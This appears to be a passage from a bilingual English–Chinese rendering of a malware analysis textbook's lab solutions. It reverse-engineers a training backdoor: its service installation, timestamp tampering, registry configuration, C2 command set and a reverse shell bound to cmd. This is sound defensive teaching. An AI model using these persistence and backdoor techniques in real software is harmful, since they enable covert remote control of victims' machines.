  zh: 显示调用 CreateServiceA 时的调用栈状态，包括 ASCII 字符串名称、描述和路径。在地址 0x4028A1，恶意软件将其自身复制到 *%SYSTEMROOT%\
    system32\* 。地址 0x4015B0 的函数更改了复制的修改时间、访问时间和更改时间戳，以匹配系统文件 *kernel32.dll* 的那些时间戳。将时间戳修改为与另一个文件匹配称为
    *时间戳篡改*。
- en: '**9**'
  id: totrans-2156
  prefs: []
  type: TYPE_NORMAL
  zh: '**9**'
- en: '*Figure 9-7L: Stack state at call to CreateServiceA at address 0x402805*'
  id: totrans-2157
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-7L：在地址 0x402805 调用 CreateServiceA 时的堆栈状态*'
- en: Finally, the malware creates the registry key HKLM\SOFTWARE\Microsoft \XPS.
  id: totrans-2158
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，恶意软件创建注册表键 HKLM\SOFTWARE\Microsoft \XPS。
- en: The trailing space after Microsoft makes this a unique host-based indicator.
  id: totrans-2159
  prefs: []
  type: TYPE_NORMAL
  zh: Microsoft 在此之后跟随着一个空格，使其成为一个独特的基于主机的指示器。
- en: It fills the value named Configuration with the contents of a buffer pointed
    to by the EDX register at address 0x4011BE. To find out what the contents of that
    buffer were, set a breakpoint at the address 0x4011BE, and run (press F9) to it.
    Right-click the contents of the EDX register in the registers window and select
    **Follow in Dump**. The hex dump view shows four NULL-terminated strings followed
    by many zeros, as shown in Figure 9-8L. The strings contain the values ups, http://www.practicalmalwareanalysis.com,
    80, and 60\. This looks like it may be the configuration data related to a network
    capability of the malware.
  id: totrans-2160
  prefs: []
  type: TYPE_NORMAL
  zh: 它将名为 Configuration 的值填充为地址 0x4011BE 由 EDX 寄存器指向的缓冲区的内容。要找出该缓冲区的内容，请在地址 0x4011BE
    设置一个断点，并运行（按 F9）到它。在寄存器窗口中右键单击 EDX 寄存器的值，并选择 **在转储中跟随**。十六进制转储视图显示了四个以 NULL 结尾的字符串，后面跟着许多零，如图
    9-8L 所示。这些字符串包含 ups、http://www.practicalmalwareanalysis.com、80 和 60 的值。这看起来可能是与恶意软件的网络功能相关的配置数据。
- en: '*Figure 9-8L: Networking strings seen in memory*'
  id: totrans-2161
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-8L：内存中看到的网络字符串*'
- en: '**Command-Line Option Analysis**'
  id: totrans-2162
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令行选项分析**'
- en: With the installation routine of the malware documented, we can now explore
    the other functionality by continuing to debug it with OllyDbg or disassembling
    it with IDA Pro. First, we’ll use IDA Pro to describe other code Solutions to
    Labs
  id: totrans-2163
  prefs: []
  type: TYPE_NORMAL
  zh: 在记录了恶意软件的安装例程后，我们现在可以通过继续使用 OllyDbg 调试或使用 IDA Pro 反汇编来探索其他功能。首先，我们将使用 IDA Pro
    描述其他代码解决方案到实验室
- en: '**535**'
  id: totrans-2164
  prefs: []
  type: TYPE_NORMAL
  zh: '**535**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2165
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: paths. This sample supports the switches -in, -re, -c, and -cc, as shown in
    Table 9-1L. These can be easily identified in the main function by looking for
    calls to __mbscmp.
  id: totrans-2166
  prefs: []
  type: TYPE_NORMAL
  zh: 路径。此样本支持 -in、-re、-c 和 -cc 开关，如表 9-1L 所示。这些可以通过在主函数中查找对 __mbscmp 的调用轻松识别。
- en: '**Table 9-1L:** Supported Command-Line Switches'
  id: totrans-2167
  prefs: []
  type: TYPE_NORMAL
  zh: '**表 9-1L：支持的命令行开关**'
- en: '**Command-line switch**'
  id: totrans-2168
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令行开关**'
- en: '**Address of implementation**'
  id: totrans-2169
  prefs: []
  type: TYPE_NORMAL
  zh: '**实现地址**'
- en: '**Behavior**'
  id: totrans-2170
  prefs: []
  type: TYPE_NORMAL
  zh: '**行为**'
- en: -in
  id: totrans-2171
  prefs: []
  type: TYPE_NORMAL
  zh: -in
- en: '0x402600'
  id: totrans-2172
  prefs: []
  type: TYPE_NORMAL
  zh: '0x402600'
- en: Installs a service
  id: totrans-2173
  prefs: []
  type: TYPE_NORMAL
  zh: 安装服务
- en: -re
  id: totrans-2174
  prefs: []
  type: TYPE_NORMAL
  zh: -re
- en: '0x402900'
  id: totrans-2175
  prefs: []
  type: TYPE_NORMAL
  zh: '0x402900'
- en: Uninstalls a service
  id: totrans-2176
  prefs: []
  type: TYPE_NORMAL
  zh: 卸载服务
- en: -c
  id: totrans-2177
  prefs: []
  type: TYPE_NORMAL
  zh: -c
- en: '0x401070'
  id: totrans-2178
  prefs: []
  type: TYPE_NORMAL
  zh: '0x401070'
- en: Sets a configuration key
  id: totrans-2179
  prefs: []
  type: TYPE_NORMAL
  zh: 设置配置密钥
- en: -cc
  id: totrans-2180
  prefs: []
  type: TYPE_NORMAL
  zh: -cc
- en: '0x401280'
  id: totrans-2181
  prefs: []
  type: TYPE_NORMAL
  zh: '0x401280'
- en: Prints a configuration key
  id: totrans-2182
  prefs: []
  type: TYPE_NORMAL
  zh: 打印配置密钥
- en: Compare the function that starts at address 0x402900, which corresponds to the
    command-line parameter -re, with the installation function that we examined earlier.
    The -re function does the exact opposite of the function at 0x402600\. It opens
    the service manager (address 0x402915), locates an installation of the malware
    (address 0x402944), and deletes the service (address 0x402977). Finally, it deletes
    the copy of the malware located in *%SYSTEMROOT%\ system32* and removes the configuration
    registry value (addresses 0x402A9D and 0x402AD5).
  id: totrans-2183
  prefs: []
  type: TYPE_NORMAL
  zh: 将从地址0x402900开始的函数与之前检查的安装函数进行比较，该地址对应于命令行参数-re。-re函数与0x402600地址处的函数正好相反。它打开服务管理器（地址0x402915），定位恶意软件的安装（地址0x402944），并删除服务（地址0x402977）。最后，它删除位于*%SYSTEMROOT%\
    system32*中的恶意软件副本，并移除配置注册表值（地址0x402A9D和0x402AD5）。
- en: Next, look at the function that starts at address 0x401070, which runs if we
    provide the -c switch. If you’ve been diligent in renaming functions with descriptive
    names in IDA Pro, then it will be obvious that we have already encountered this
    function, during both the installation and uninstallation routines. If you’ve
    forgotten to update this function name, use the cross-reference feature of IDA
    Pro to verify that this function is used in all those places. To do this, navigate
    to the function implementation, click the function name, right-click the name,
    and select **Xrefs to**.
  id: totrans-2184
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，查看从地址0x401070开始的函数，如果提供-c开关，则运行。如果你在IDA Pro中已经用描述性名称仔细重命名了函数，那么很明显，我们在安装和卸载例程中都已经遇到过这个函数。如果你忘记更新这个函数名称，请使用IDA
    Pro的交叉引用功能来验证该函数是否在所有这些地方使用。为此，导航到函数实现，单击函数名称，右键单击名称，并选择**Xrefs to**。
- en: The function that starts at 0x401070 takes four parameters, which it concatenates
    together. The string concatenation functions are inline and can be identified
    by the REP MOVSx (REPeat MOVe String) instructions. The function writes the resultant
    buffer to the registry value Configuration of the Windows registry key HKLM\SOFTWARE\Microsoft
    \XPS. Providing the -c switch to the malware allows the user to update the malware
    configuration in the Windows registry. Figure 9-9L shows the entry in the Windows
    registry using Regedit after a default installation of the malware.
  id: totrans-2185
  prefs: []
  type: TYPE_NORMAL
  zh: 从0x401070地址开始的函数接受四个参数，并将它们连接在一起。字符串连接函数是内联的，可以通过REP MOVSx（REPeat MOVe String）指令来识别。该函数将结果缓冲区写入Windows注册表的HKLM\SOFTWARE\Microsoft
    \XPS键的Configuration值。向恶意软件提供-c开关允许用户更新Windows注册表中的恶意软件配置。图9-9L显示了恶意软件默认安装后使用Regedit在Windows注册表中的条目。
- en: The function at 0x401280, which executes if the -cc switch is provided, is the
    reverse of the configure function (0x401070), as it reads the contents of the
    configuration registry value and places the fields into buffers specified as function
    arguments. If the -cc switch is provided to the malware, the current configuration
    is read from the registry and formatted into a string.
  id: totrans-2186
  prefs: []
  type: TYPE_NORMAL
  zh: 如果提供-cc开关，则执行0x401280地址处的函数，它是配置函数（0x401070）的反向操作，因为它读取配置注册表值的值并将字段放入作为函数参数指定的缓冲区中。如果向恶意软件提供-cc开关，则从注册表中读取当前配置并将其格式化为字符串。
- en: 'The malware then prints this string to the console. Here is the output of the
    -cc switch after a default installation of the malware: C:>Lab09-01-patched.exe
    –cc epar'
  id: totrans-2187
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件随后将此字符串打印到控制台。以下是恶意软件默认安装后-c开关的输出：C:>Lab09-01-patched.exe –cc epar
- en: k:ups h:http://www.practicalmalwareanalysis.com p:80 per:60
  id: totrans-2188
  prefs: []
  type: TYPE_NORMAL
  zh: k:ups h:http://www.practicalmalwareanalysis.com p:80 per:60
- en: '**536**'
  id: totrans-2189
  prefs: []
  type: TYPE_NORMAL
  zh: '**536**'
- en: Appendix C
  id: totrans-2190
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2191
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 121](index-570_1.jpg)'
  id: totrans-2192
  prefs: []
  type: TYPE_IMG
  zh: '![Image 121](index-570_1.jpg)'
- en: '*Figure 9-9L: Configuration registry value*'
  id: totrans-2193
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-9L：配置注册表值*'
- en: '**9**'
  id: totrans-2194
  prefs: []
  type: TYPE_NORMAL
  zh: '**9**'
- en: The final code path is reached when the malware is installed and not provided
    with any command-line parameters. The malware checks for installation at address
    0x401000 by determining whether the registry key was created. The implementation
    of the default behavior is found in the function starting at address 0x402360\.
    Note the jump up at 0x402403 and back to 0x40236D, which indicates a loop, and
    that the three exit conditions (at addresses 0x4023B6, 0x4023E0, and 0x402408)
    lead directly to program termination. It looks like the malware gets the current
    configuration, calls a function, sleeps for a second, and then repeats the process
    forever.
  id: totrans-2195
  prefs: []
  type: TYPE_NORMAL
  zh: 当恶意软件安装且未提供任何命令行参数时，达到最终的代码路径。恶意软件通过确定是否创建了注册表键来检查安装，地址为0x401000。默认行为的实现可以在从地址0x402360开始的函数中找到。注意在0x402403处的跳转回到0x40236D，这表明有一个循环，以及三个退出条件（在地址0x4023B6、0x4023E0和0x402408）直接导致程序终止。看起来恶意软件获取当前配置，调用一个函数，休眠一秒钟，然后永远重复这个过程。
- en: '**Backdoor Analysis**'
  id: totrans-2196
  prefs: []
  type: TYPE_NORMAL
  zh: '**后门分析**'
- en: 'The backdoor functionality is implemented in a chain of functions first called
    from the infinite loop. The function at 0x402020 calls the function starting at
    address 0x401E60, and compares the beginning of the string returned against a
    list of the supported values: SLEEP, UPLOAD, DOWNLOAD, CMD, and NOTHING. If the
    malware encounters one of these strings, it will call a function that responds
    to that request, in a process similar to the parsing of the command-line arguments.
    Table 9-2L summarizes the supported commands, showing the adjustable parameters
    in italics.'
  id: totrans-2197
  prefs: []
  type: TYPE_NORMAL
  zh: 后门功能是在一系列函数中实现的，这些函数首先从无限循环中被调用。地址为0x402020的函数调用从地址0x401E60开始的函数，并将返回的字符串的开始部分与支持值的列表进行比较：SLEEP、UPLOAD、DOWNLOAD、CMD和NOTHING。如果恶意软件遇到这些字符串之一，它将调用一个响应该请求的函数，其过程类似于解析命令行参数。表9-2L总结了支持的命令，其中斜体表示可调整的参数。
- en: '**Table 9-2L:** Supported Commands'
  id: totrans-2198
  prefs: []
  type: TYPE_NORMAL
  zh: '**表9-2L：支持的命令**'
- en: '**Address of**'
  id: totrans-2199
  prefs: []
  type: TYPE_NORMAL
  zh: '**地址为**'
- en: '**Command-string**'
  id: totrans-2200
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令字符串**'
- en: '**Command**'
  id: totrans-2201
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令**'
- en: '**implementation**'
  id: totrans-2202
  prefs: []
  type: TYPE_NORMAL
  zh: '**实现**'
- en: '**format**'
  id: totrans-2203
  prefs: []
  type: TYPE_NORMAL
  zh: '**格式**'
- en: '**Behavior**'
  id: totrans-2204
  prefs: []
  type: TYPE_NORMAL
  zh: '**行为**'
- en: SLEEP
  id: totrans-2205
  prefs: []
  type: TYPE_NORMAL
  zh: SLEEP
- en: '0x402076'
  id: totrans-2206
  prefs: []
  type: TYPE_NORMAL
  zh: '0x402076'
- en: SLEEP *secs*
  id: totrans-2207
  prefs: []
  type: TYPE_NORMAL
  zh: SLEEP *秒数*
- en: Sleeps for *secs* seconds
  id: totrans-2208
  prefs: []
  type: TYPE_NORMAL
  zh: 休眠*秒数*秒
- en: UPLOAD
  id: totrans-2209
  prefs: []
  type: TYPE_NORMAL
  zh: UPLOAD
- en: '0x4019E0'
  id: totrans-2210
  prefs: []
  type: TYPE_NORMAL
  zh: '0x4019E0'
- en: UPLOAD *port*
  id: totrans-2211
  prefs: []
  type: TYPE_NORMAL
  zh: UPLOAD *端口*
- en: Creates the file *filename* on the local
  id: totrans-2212
  prefs: []
  type: TYPE_NORMAL
  zh: 在本地创建*文件名*文件
- en: '*filename*'
  id: totrans-2213
  prefs: []
  type: TYPE_NORMAL
  zh: '*文件名*'
- en: system by first connecting to the remote
  id: totrans-2214
  prefs: []
  type: TYPE_NORMAL
  zh: 通过首先连接到远程
- en: host over port *port* and reading the
  id: totrans-2215
  prefs: []
  type: TYPE_NORMAL
  zh: 主机通过端口*端口*并读取
- en: contents
  id: totrans-2216
  prefs: []
  type: TYPE_NORMAL
  zh: 内容
- en: DOWNLOAD
  id: totrans-2217
  prefs: []
  type: TYPE_NORMAL
  zh: DOWNLOAD
- en: '0x401870'
  id: totrans-2218
  prefs: []
  type: TYPE_NORMAL
  zh: '0x401870'
- en: DOWNLOAD *port*
  id: totrans-2219
  prefs: []
  type: TYPE_NORMAL
  zh: DOWNLOAD *端口*
- en: Reads the file *filename* and sends it to
  id: totrans-2220
  prefs: []
  type: TYPE_NORMAL
  zh: 读取*文件名*文件并发送到
- en: '*filename*'
  id: totrans-2221
  prefs: []
  type: TYPE_NORMAL
  zh: '*文件名*'
- en: the remote host over port *port*
  id: totrans-2222
  prefs: []
  type: TYPE_NORMAL
  zh: 通过端口*端口*的远程主机
- en: '*(continued)*'
  id: totrans-2223
  prefs: []
  type: TYPE_NORMAL
  zh: '*(继续)*'
- en: Solutions to Labs
  id: totrans-2224
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**537**'
  id: totrans-2225
  prefs: []
  type: TYPE_NORMAL
  zh: '**537**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2226
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Table 9-2L:** Supported Commands (continued) **Address of**'
  id: totrans-2227
  prefs: []
  type: TYPE_NORMAL
  zh: '**表9-2L：支持的命令（继续）**地址为'
- en: '**Command-string**'
  id: totrans-2228
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令字符串**'
- en: '**Command**'
  id: totrans-2229
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令**'
- en: '**implementation**'
  id: totrans-2230
  prefs: []
  type: TYPE_NORMAL
  zh: '**实现**'
- en: '**format**'
  id: totrans-2231
  prefs: []
  type: TYPE_NORMAL
  zh: '**格式**'
- en: '**Behavior**'
  id: totrans-2232
  prefs: []
  type: TYPE_NORMAL
  zh: '**行为**'
- en: CMD
  id: totrans-2233
  prefs: []
  type: TYPE_NORMAL
  zh: CMD
- en: '0x402268'
  id: totrans-2234
  prefs: []
  type: TYPE_NORMAL
  zh: '0x402268'
- en: CMD *port*
  id: totrans-2235
  prefs: []
  type: TYPE_NORMAL
  zh: CMD *端口*
- en: Executes the shell command *command*
  id: totrans-2236
  prefs: []
  type: TYPE_NORMAL
  zh: 执行*命令*的shell命令
- en: '*command*'
  id: totrans-2237
  prefs: []
  type: TYPE_NORMAL
  zh: '*命令*'
- en: with *cmd.exe* and sends the output to
  id: totrans-2238
  prefs: []
  type: TYPE_NORMAL
  zh: 使用*cmd.exe*并将输出发送到
- en: the remote host over port *port*
  id: totrans-2239
  prefs: []
  type: TYPE_NORMAL
  zh: 通过端口*端口*的远程主机
- en: NOTHING
  id: totrans-2240
  prefs: []
  type: TYPE_NORMAL
  zh: NOTHING
- en: '0x402356'
  id: totrans-2241
  prefs: []
  type: TYPE_NORMAL
  zh: '0x402356'
- en: NOTHING
  id: totrans-2242
  prefs: []
  type: TYPE_NORMAL
  zh: NOTHING
- en: No operation
  id: totrans-2243
  prefs: []
  type: TYPE_NORMAL
  zh: 无操作
- en: '**NOTE**'
  id: totrans-2244
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*UPLOAD and DOWNLOAD commands are reversed from their standard usage. Always
    focus* *on the underlying functionality for your analysis and not the individual
    strings used* *by the malware.*'
  id: totrans-2245
  prefs: []
  type: TYPE_NORMAL
  zh: '*UPLOAD和DOWNLOAD命令与标准用法相反。在分析时，始终关注底层功能，而不是恶意软件使用的单个字符串。*'
- en: '**Networking Analysis**'
  id: totrans-2246
  prefs: []
  type: TYPE_NORMAL
  zh: '**网络分析**'
- en: At this point, we see that we have a full-featured backdoor on our hands. The
    malware can execute arbitrary shell commands and built-in routines for file upload
    and download. Next, we’ll explore the function that starts at address 0x401E60
    and returns the command to the behavior dispatcher. This will show how a command
    is communicated to the malware from the remote host, which may enable us to create
    network-based signatures for this sample.
  id: totrans-2247
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一点上，我们可以看到我们手头有一个功能齐全的后门。恶意软件可以执行任意的shell命令和文件上传下载的内建例程。接下来，我们将探索从地址0x401E60开始的函数，该函数将命令返回给行为调度器。这将展示命令是如何从远程主机传递给恶意软件的，这可能使我们能够为这个样本创建基于网络的签名。
- en: While browsing the contents of 0x401E60, we see quite a few calls to functions
    with only one cross-reference. Rather than fully reverse each function, we debug
    this code path using OllyDbg. Before doing this, ensure that the malware has been
    successfully installed by running the malware with the
  id: totrans-2248
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览0x401E60的内容时，我们看到很多只具有一个交叉引用的函数调用。我们不会完全逆向每个函数，而是使用OllyDbg来调试这个代码路径。在这样做之前，请确保恶意软件已成功安装，通过运行带有
- en: -cc option, which should print out the current configuration if the program
    is installed, or attempt to delete itself if it is not.
  id: totrans-2249
  prefs: []
  type: TYPE_NORMAL
  zh: '`-cc`选项，如果程序已安装，则应打印出当前配置，如果没有安装，则尝试删除自身。'
- en: Next, open the malware with OllyDbg and delete any saved command-line parameters
    so that the malware will perform its default behavior. Set a breakpoint at address
    0x401E60\. You can easily navigate to this address by pressing CTRL-G and entering
    **401E60**. Set the breakpoint at that location by pressing F2\.
  id: totrans-2250
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，使用OllyDbg打开恶意软件，删除任何保存的命令行参数，以便恶意软件执行其默认行为。在地址0x401E60处设置一个断点。您可以通过按CTRL-G并输入**401E60**轻松导航到该地址。通过按F2在该位置设置断点。
- en: Run through this region a few times using **Step Over** (press F8). Pay particular
    attention to the function arguments and return values.
  id: totrans-2251
  prefs: []
  type: TYPE_NORMAL
  zh: 使用**Step Over**（按F8键）在这个区域运行几次。特别注意函数的参数和返回值。
- en: First, we’ll examine the function that starts at 0x401420\. We set a breakpoint
    at the call at address 0x401E85 and at the instruction immediately after it (0x401E8A).
    At the first breakpoint, two parameters have been pushed onto the stack. On the
    top of the stack, we see the address 0x12BAAC, followed by the integer 0x400\.
    If we follow the address in the dump view, we see that it contains a large chunk
    of zeros—probably at least 0x400 bytes of free space. Next, run the malware (press
    F9) to the second breakpoint. In the function that starts at address 0x401420,
    the malware writes the ASCII string http://www.practicalmalwareanalysis.com into
    the buffer. We can now (correctly) hypothesize that this function gets a particular
    configuration value from the Windows registry, which was initialized during installation,
    and puts it in a buffer. Now let’s try the same approach with the functions that
    start at addresses 0x401470 and 0x401D80\.
  id: totrans-2252
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们将检查从0x401420开始的函数。我们在地址0x401E85的调用和紧随其后的指令（0x401E8A）处设置了一个断点。在第一个断点处，两个参数已推入堆栈。在堆栈顶部，我们看到地址0x12BAAC，后面跟着整数0x400。如果我们跟随转储视图中的地址，我们看到它包含一大块零——可能至少有0x400字节的空闲空间。接下来，运行恶意软件（按F9）到第二个断点。在从地址0x401420开始的函数中，恶意软件将ASCII字符串http://www.practicalmalwareanalysis.com写入缓冲区。现在我们可以（正确地）假设这个函数从Windows注册表中获取特定的配置值，该值在安装期间初始化，并将其放入缓冲区。现在让我们尝试使用从地址0x401470和0x401D80开始的函数采用相同的方法。
- en: '**538**'
  id: totrans-2253
  prefs: []
  type: TYPE_NORMAL
  zh: '**538**'
- en: Appendix C
  id: totrans-2254
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2255
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The function that starts at 0x401470 is analogous to the function that starts
    at 0x401420, except that it returns the number 80 (0x50) rather than a URL. This
    string contains the port number associated with the server at *http://www.practicalmalwareanalysis.com/*.
  id: totrans-2256
  prefs: []
  type: TYPE_NORMAL
  zh: 从0x401470开始的函数与从0x401420开始的函数类似，不同之处在于它返回数字80（0x50）而不是URL。这个字符串包含与服务器*http://www.practicalmalwareanalysis.com/*关联的端口号。
- en: The function that starts at 0x401D80 is a little different in that it does not
    return the same value at each invocation. Rather, it appears to return an ASCII
    string containing random characters. After debugging this function many times,
    a pattern will appear that involves the forward slash (/) and dot (.) characters.
    Perhaps the returned string corresponds to a URL-like scheme.
  id: totrans-2257
  prefs: []
  type: TYPE_NORMAL
  zh: 从0x401D80开始的函数略有不同，它在每次调用时并不返回相同的值。相反，它似乎返回一个包含随机字符的ASCII字符串。在多次调试此函数后，将出现涉及正斜杠（/）和点（.）字符的模式。也许返回的字符串对应于类似URL的方案。
- en: When the malware is analyzed in an isolated testing environment, it will repeatedly
    fail somewhere within the next function, which starts at address 0x401D80\. Returning
    to the disassembly view of IDA Pro, we see that within this function, the malware
    constructs an HTTP/1.0 GET request and connects to a remote system. This connection
    is unlikely to be blocked by corporate firewalls, since it is a valid outbound
    HTTP request. If your malware analysis **9**
  id: totrans-2258
  prefs: []
  type: TYPE_NORMAL
  zh: 当在隔离的测试环境中分析恶意软件时，它将在下一个函数的某个地方反复失败，该函数从地址 0x401D80 开始。回到 IDA Pro 的反汇编视图，我们看到在这个函数中，恶意软件构建了一个
    HTTP/1.0 GET 请求并连接到远程系统。由于这是一个有效的出站 HTTP 请求，因此这种连接不太可能被企业防火墙阻止。如果你的恶意软件分析 **9**
- en: virtual machine has networking disabled, the outbound connection will never
    succeed, and the malware fails. However, by following the disassembly listing
    carefully, you will see that the malware does, in fact, attempt to connect to
    the domain and port recorded in the registry configuration key, and requests a
    randomly named resource. Further analysis of the disassembly shows that the malware
    searches the document returned by the server for the particular strings `’`’`
    (backtick, apostrophe, backtick, apostrophe, backtick) and ’`’`’ (apostrophe,
    backtick, apostrophe, backtick, apostrophe), and uses these to delineate the command-and-control
    protocol.
  id: totrans-2259
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟机已禁用网络，出站连接永远不会成功，恶意软件将失败。然而，通过仔细查看反汇编列表，你会看到恶意软件确实尝试连接到注册表中记录的域名和端口，并请求一个随机命名的资源。对反汇编的进一步分析显示，恶意软件在服务器返回的文档中搜索特定的字符串
    `’`’`（反引号，撇号，反引号，撇号，反引号）和 `’`’`’（撇号，反引号，撇号，反引号，撇号），并使用这些字符串来界定命令和控制协议。
- en: '**Malware Summary**'
  id: totrans-2260
  prefs: []
  type: TYPE_NORMAL
  zh: '**恶意软件摘要**'
- en: This sample is an HTTP reverse backdoor. The password abcd must be provided
    as the last parameter when invoking the malware for installation, configuration,
    and removal. It installs itself by copying itself to the *%SYSTEMROOT%\* *WINDOWS\system32*
    directory and creating an autorun service. The malware can be cleanly removed
    by passing the command-line argument -re, or reconfigured using the -c flag.
  id: totrans-2261
  prefs: []
  type: TYPE_NORMAL
  zh: 此样本是一个 HTTP 反向后门。在调用恶意软件进行安装、配置和卸载时，必须提供密码 abcd 作为最后一个参数。它通过将自己复制到 *%SYSTEMROOT%\*
    *WINDOWS\system32* 目录并创建一个自动运行服务来自动安装。可以通过传递命令行参数 -re 或使用 -c 标志重新配置来干净地移除恶意软件。
- en: When run after installation, the malware uses a registry key to fetch server
    configuration information, and makes HTTP/1.0 GET requests to the remote system.
    The command-and-control protocol is embedded within the response document. The
    malware recognizes five commands, including one that specifies the execution of
    arbitrary shell commands.
  id: totrans-2262
  prefs: []
  type: TYPE_NORMAL
  zh: 在安装后运行时，恶意软件使用注册表键来获取服务器配置信息，并向远程系统发出 HTTP/1.0 GET 请求。命令和控制协议嵌入在响应文档中。恶意软件识别五个命令，包括一个指定执行任意
    shell 命令的命令。
- en: '**Lab 9-2 Solutions**'
  id: totrans-2263
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验 9-2 解答**'
- en: '***Short Answers***'
  id: totrans-2264
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-2265
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The imports and the string cmd are the only interesting strings that appear
    statically in the binary.
  id: totrans-2266
  prefs: []
  type: TYPE_NORMAL
  zh: 导入和字符串 cmd 是在二进制文件中静态出现的唯一有趣的字符串。
- en: 2\.
  id: totrans-2267
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: It terminates without doing much.
  id: totrans-2268
  prefs: []
  type: TYPE_NORMAL
  zh: 它在执行很少的操作后终止。
- en: 3\.
  id: totrans-2269
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: Rename the file *ocl.exe* before you run it.
  id: totrans-2270
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行之前，请重命名文件 *ocl.exe*。
- en: Solutions to Labs
  id: totrans-2271
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**539**'
  id: totrans-2272
  prefs: []
  type: TYPE_NORMAL
  zh: '**539**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2273
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 4\.
  id: totrans-2274
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: A string is being built on the stack, which is used by attackers to obfuscate
    strings from simple strings utilities and basic static analysis techniques.
  id: totrans-2275
  prefs: []
  type: TYPE_NORMAL
  zh: 在堆栈上正在构建一个字符串，攻击者使用它来混淆来自简单字符串工具和基本静态分析技术的字符串。
- en: 5\.
  id: totrans-2276
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: The string 1qaz2wsx3edc and a pointer to a buffer of data are passed to subroutine
    0x401089\.
  id: totrans-2277
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 1qaz2wsx3edc 和指向数据缓冲区的指针被传递到子程序 0x401089。
- en: 6\.
  id: totrans-2278
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The malware uses the domain *practicalmalwareanalysis.com*.
  id: totrans-2279
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用域名 *practicalmalwareanalysis.com*。
- en: 7\.
  id: totrans-2280
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: The malware will XOR the encoded DNS name with the string 1qaz2wsx3edc to decode
    the domain name.
  id: totrans-2281
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将编码的 DNS 名称与字符串 1qaz2wsx3edc 进行 XOR 运算以解码域名。
- en: 8\.
  id: totrans-2282
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: The malware is setting the stdout, stderr, and stdin handles (used in the STARTUPINFO
    structure of CreateProcessA) to the socket. Since CreateProcessA is called with
    cmd as an argument, this will create a reverse shell by tying the command shell
    to the socket.
  id: totrans-2283
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将 stdout、stderr 和 stdin 处理程序（用于 CreateProcessA 函数的 STARTUPINFO 结构中）设置为套接字。由于
    CreateProcessA 函数以 cmd 作为参数被调用，这将通过将命令 shell 绑定到套接字来创建一个反向 shell。
- en: '***Detailed Analysis***'
  id: totrans-2284
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We will use dynamic analysis and OllyDbg to analyze this piece of malware in
    order to determine its functionality. But before we get into debugging, let’s
    begin by running Strings on the binary. We see the imports and the string cmd.
    Next, we’ll simply run the binary to see if anything interesting happens.
  id: totrans-2285
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用动态分析和 OllyDbg 来分析这段恶意软件，以确定其功能。但在我们开始调试之前，让我们先在二进制文件上运行 Strings。我们看到导入项和字符串
    cmd。接下来，我们将简单地运行二进制文件，看看是否会发生任何有趣的事情。
- en: Based on the process launch and exit in Process Explorer, the process seems
    to terminate almost immediately. We are definitely going to need to debug this
    piece to see what’s going on.
  id: totrans-2286
  prefs: []
  type: TYPE_NORMAL
  zh: 根据 Process Explorer 中的进程启动和退出，进程似乎几乎立即终止。我们肯定需要调试这个进程以查看发生了什么。
- en: When we load the binary into IDA Pro, we see the main function begins at 0x401128\.
    OllyDbg will break at the entry point of the application, but the entry point
    contains a lot of uninteresting code generated by the compiler, so we’ll set a
    software breakpoint on main, since we want to focus on it.
  id: totrans-2287
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们将二进制文件加载到 IDA Pro 中时，我们看到主函数从 0x401128 开始。OllyDbg 将在应用程序的入口点处中断，但入口点包含大量由编译器生成的无趣代码，因此我们将软件断点设置在
